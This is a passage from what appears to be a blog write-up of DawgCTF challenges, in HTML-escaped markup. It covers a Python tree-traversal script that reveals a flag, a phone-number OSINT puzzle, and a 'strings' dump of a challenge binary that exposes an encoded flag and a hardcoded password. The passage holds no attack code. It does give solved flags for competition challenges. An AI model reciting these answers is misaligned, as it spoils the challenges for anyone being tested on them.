&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;node&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;        node&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;left &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;insert&lt;&#x2F;span&gt;&lt;span&gt;(node&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;left&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;char)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        node&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;right &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;insert&lt;&#x2F;span&gt;&lt;span&gt;(node&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;right&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;char)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;node
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;postorder_traversal&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;node&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;node:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;postorder_traversal&lt;&#x2F;span&gt;&lt;span&gt;(node&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;left)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;postorder_traversal&lt;&#x2F;span&gt;&lt;span&gt;(node&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;right)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(node&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Sample input values
&lt;&#x2F;span&gt;&lt;span&gt;values &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;}&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;!&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;_&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;s&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;t&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;22&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;3&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;t&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;26&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;r&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, 
&lt;&#x2F;span&gt;&lt;span&gt;          (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;F&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;n&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;C&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;23&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;m&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;g&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;17&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;s&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, 
&lt;&#x2F;span&gt;&lt;span&gt;          (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;25&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;f&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;19&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;3&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;D&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;h&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;27&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;r&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;w&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;T&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;29&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;s&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;15&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;_&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, 
&lt;&#x2F;span&gt;&lt;span&gt;          (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;_&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;{&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;D&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;21&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;t&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;root &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;None
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;values:
&lt;&#x2F;span&gt;&lt;span&gt;    root &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;insert&lt;&#x2F;span&gt;&lt;span&gt;(root&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;value[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;postorder_traversal&lt;&#x2F;span&gt;&lt;span&gt;(root)  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Output: DawgCTF{D0nt_m1ss_th3_f0rr3st!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag :  DawgCTF{D0nt_m1ss_th3_f0rr3st!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;ring-ring&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#ring-ring&quot; aria-label=&quot;Anchor link for: ring-ring&quot;&gt;Ring Ring&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_ring.png&quot; alt=&quot;ring&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We have find the state and town of the call made by &lt;code&gt;(227-759-4976)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;After surfing the web for a while I found this number on &lt;a href=&quot;https:&#x2F;&#x2F;wiki-phones.com&#x2F;phone&#x2F;12277594976&quot; target=_blank&gt;this site&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_ring1.png&quot; alt=&quot;ring&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I observed that the call originated from &lt;code&gt;USA&lt;&#x2F;code&gt; Now I used USA &lt;code&gt;country code(+1)&lt;&#x2F;code&gt; to search about phone number.&lt;&#x2F;p&gt;
&lt;p&gt;I got to know about that &lt;code&gt;227&lt;&#x2F;code&gt; is area code of the number location. Searched for the State of the area code 227. After visiting many sites, I found &lt;a href=&quot;https:&#x2F;&#x2F;www.zipdatamaps.com&#x2F;area-code-227&quot; target=_blank&gt;this map&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_ring2.png&quot; alt=&quot;ring&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The State is &lt;code&gt;maryland&lt;&#x2F;code&gt; and the Town is &lt;code&gt;Cumberland&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{cumberland_maryland}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;pwn&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#pwn&quot; aria-label=&quot;Anchor link for: pwn&quot;&gt;PWN&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;strings-things&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#strings-things&quot; aria-label=&quot;Anchor link for: strings-things&quot;&gt;Strings Things&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_strings.png&quot; alt=&quot;strings&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached file : &lt;a href=&quot;https:&#x2F;&#x2F;drive.google.com&#x2F;drive&#x2F;folders&#x2F;1ktBUj4BHeIOu-1WIjdoHcynDkHQPvq0X&quot; target=_blank&gt;secrets&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As the challenge name suggests, the &lt;code&gt;strings&lt;&#x2F;code&gt; done the things.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;strings$&lt;&#x2F;span&gt;&lt;span&gt; strings secrets
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gE%*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0?{H
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;libstdc++.so.6
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;__gmon_start__
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_ITM_deregisterTMCloneTable
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_ITM_registerTMCloneTable
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;libm.so.6
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;libgcc_s.so.1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;libc.so.6
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;puts
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stdin
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fgets
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strcspn
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strcmp
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;__libc_start_main
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GLIBC_2.2.5
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;m   
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;lt;=t9H
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; fH
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getsf
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[]A&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\A&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;]A^A_
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;RGF3Z0NURntzdHIxbmc1X3cxbmc1fQ
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;supers3cr3tpassword
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; the password: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;You&lt;&#x2F;span&gt;&lt;span&gt; did it!
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;The&lt;&#x2F;span&gt;&lt;span&gt; flag is: %s
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Incorrect&lt;&#x2F;span&gt;&lt;span&gt; password. Try again.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;*3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;$&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;GCC: (GNU) 8.5.0 20210514 (Red Hat 8.5.0-15)
